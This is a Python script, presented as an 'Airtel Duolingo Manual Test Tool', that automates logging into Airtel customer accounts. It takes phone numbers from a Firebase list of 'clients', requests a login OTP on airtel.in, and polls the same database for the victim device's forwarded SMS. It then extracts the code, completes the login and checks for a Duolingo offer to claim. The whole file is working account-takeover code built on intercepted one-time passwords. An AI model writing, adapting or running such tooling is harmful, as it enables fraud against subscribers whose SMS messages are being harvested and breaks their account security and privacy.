#!/usr/bin/env python3
"""
Airtel Duolingo Manual Test Tool
Run: python airtel_manual_test.py
"""

import asyncio
import aiohttp
import re
import json
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
FIREBASE_URL = input("Firebase URL (e.g. https://xxx-default-rtdb.firebaseio.com): ").strip().rstrip("/")
FIREBASE_KEY = input("Firebase Auth Key (leave blank if none): ").strip()

AIRTEL_LOGIN_URL  = "https://www.airtel.in/manage-account/login"
AIRTEL_THANKS_URL = "https://www.airtel.in/thanks/"

# ── FIREBASE HELPERS ──────────────────────────────────────────────────────────

def fb_url(path, extra=""):
    base = f"{FIREBASE_URL}/{path}"
    if FIREBASE_KEY:
        sep = "&" if "?" in base else "?"
        base += f"{sep}auth={FIREBASE_KEY}"
    if extra:
        sep = "&" if "?" in base else "?"
        base += f"{sep}{extra}"
    return base

REGIONAL_DIGITS = str.maketrans(
    "०१२३४५६७८९" "০১২৩৪৫৬৭৮৯" "੦੧੨੩੪੫੬੭੮੯",
    "0123456789" * 3
)

def normalize(text):
    return text.translate(REGIONAL_DIGITS)

async def get_devices(session):
    async with session.get(fb_url("clients.json")) as r:
        data = await r.json()
    if not isinstance(data, dict):
        return []
    devices = []
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        phone = str(info.get("phone") or info.get("number") or info.get("mobile") or "").strip().lstrip("+").lstrip("91")
        if len(phone) == 10:
            devices.append({"device_id": dev_id, "phone": phone})
    return devices

async def get_msg_keys(session, device_id):
    async with session.get(fb_url(f"messages/{device_id}.json", "shallow=true")) as r:
        data = await r.json()
    return set(data.keys()) if isinstance(data, dict) else set()

async def poll_otp(session, device_id, known_keys, timeout=120):
    import time
    deadline = time.time() + timeout
    while time.time() < deadline:
        async with session.get(fb_url(f"messages/{device_id}.json", "shallow=true")) as r:
            shallow = await r.json()
        if isinstance(shallow, dict):
            new_keys = [k for k in shallow if k not in known_keys]
            for key in new_keys:
                async with session.get(fb_url(f"messages/{device_id}/{key}.json")) as r:
                    msg = await r.json()
                if isinstance(msg, dict):
                    text = ""
                    for field in ("message", "body", "text", "content", "smsBody"):
                        v = msg.get(field, "")
                        if v and isinstance(v, str):
                            text = v; break
                    if not text:
                        text = str(msg)
                    normalized = normalize(text)
                    m = re.search(r'(?<!\d)(\d{4,6})(?!\d)', normalized)
                    if m:
                        return m.group(1)
                known_keys.add(key)
        await asyncio.sleep(2.5)
    return None

# ── MAIN ──────────────────────────────────────────────────────────────────────

async def main():
    from playwright.async_api import async_playwright

    async with aiohttp.ClientSession() as session:
        print("\n📡 Scanning Firebase devices...")
        devices = await get_devices(session)
        if not devices:
            print("❌ No devices found in Firebase.")
            return

        print(f"\n✅ Found {len(devices)} devices:\n")
        for i, d in enumerate(devices):
            print(f"  [{i+1}] +91{d['phone']}  ({d['device_id'][:12]}...)")

        choice = input("\nSelect number (1-{}) or enter phone manually: ".format(len(devices))).strip()

        if choice.isdigit() and 1 <= int(choice) <= len(devices):
            selected = devices[int(choice)-1]
        else:
            phone = choice.lstrip("+").lstrip("91")
            # find device_id for this phone
            matched = [d for d in devices if d["phone"] == phone]
            if matched:
                selected = matched[0]
            else:
                print(f"❌ Phone {phone} not found in Firebase devices.")
                return

        phone = selected["phone"]
        device_id = selected["device_id"]
        print(f"\n🚀 Starting test for +91{phone}")

        # Firebase snapshot
        known_keys = await get_msg_keys(session, device_id)
        print(f"📸 Firebase snapshot: {len(known_keys)} existing messages")

        async with async_playwright() as pw:
            print("🌐 Launching Chrome browser...")
            browser = await pw.chromium.launch(headless=False, slow_mo=300)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
            )
            page = await context.new_page()

            print(f"→ Opening {AIRTEL_LOGIN_URL}")
            await page.goto(AIRTEL_LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(3)
            print(f"  Page: {page.url}")

            # Fill phone
            filled = False
            for sel in ['input[placeholder*="mobile" i]', 'input[type="tel"]',
                        'input[maxlength="10"]', 'input[name*="mobile" i]']:
                try:
                    el = page.locator(sel).first
                    if await el.count() > 0:
                        await el.wait_for(state="visible", timeout=3000)
                        await el.fill(phone)
                        filled = True
                        print(f"  ✓ Phone filled ({sel})")
                        break
                except Exception:
                    continue

            if not filled:
                print("❌ Could not find phone input. Browser stays open — fill manually.")
                print("   Press ENTER when you've requested OTP...")
                input()
            else:
                await asyncio.sleep(1)
                # Click OTP button
                for sel in ['button:has-text("Send OTP")', 'button:has-text("SEND OTP")',
                            'button:has-text("Get OTP")', 'button:has-text("GET OTP")',
                            'button:has-text("Generate OTP")', 'button[type="submit"]']:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0:
                            await el.wait_for(state="visible", timeout=3000)
                            await el.click()
                            print(f"  ✓ OTP button clicked ({sel})")
                            break
                    except Exception:
                        continue

            # Poll Firebase for OTP
            print("\n⏳ Polling Firebase for OTP (90s)...")
            otp = await poll_otp(session, device_id, known_keys, timeout=90)

            if otp:
                print(f"🔔 OTP received from Firebase: {otp}")
            else:
                print("⏰ OTP not received from Firebase.")
                otp = input("Enter OTP manually: ").strip()

            if not otp:
                print("❌ No OTP. Exiting.")
                return

            # Enter OTP in browser
            print(f"→ Entering OTP: {otp}")
            otp_filled = False
            for sel in ['input[placeholder*="OTP" i]', 'input[maxlength="6"]',
                        'input[maxlength="4"]', 'input[type="tel"]', 'input[type="number"]']:
                try:
                    inputs = await page.locator(sel).all()
                    if len(inputs) >= 4:
                        for i, digit in enumerate(otp[:len(inputs)]):
                            await inputs[i].fill(digit)
                            await asyncio.sleep(0.1)
                        otp_filled = True
                        break
                    elif inputs:
                        await inputs[0].fill(otp)
                        otp_filled = True
                        break
                except Exception:
                    continue

            if not otp_filled:
                print("❌ OTP input not found — fill manually in browser.")
                input("Press ENTER after filling OTP and clicking Login...")
            else:
                await asyncio.sleep(1)
                # Click Login
                for sel in ['button:has-text("LOGIN")', 'button:has-text("Login")',
                            'button:has-text("Verify")', 'button:has-text("VERIFY")',
                            'button:has-text("Submit")', 'button:has-text("Continue")']:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0:
                            await el.wait_for(state="visible", timeout=5000)
                            await el.click()
                            print(f"  ✓ Login clicked ({sel})")
                            break
                    except Exception:
                        continue
                await asyncio.sleep(4)

            # Go to Thanks page
            print(f"\n→ Navigating to {AIRTEL_THANKS_URL}")
            await page.goto(AIRTEL_THANKS_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(4)
            print(f"  Page: {page.url}")

            # Check for Duolingo
            body = await page.inner_text("body")
            has_duo = "duolingo" in body.lower()
            print(f"\n{'✅ Duolingo offer FOUND on this number!' if has_duo else '❌ No Duolingo offer on this number'}")

            if has_duo:
                print("→ Clicking Claim Now...")
                input("Press ENTER when ready to proceed (or close browser to exit)...")

            print("\n🔍 Browser stays open — close it manually when done.")
            await page.wait_for_timeout(300000)  # keep open 5 min
            await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
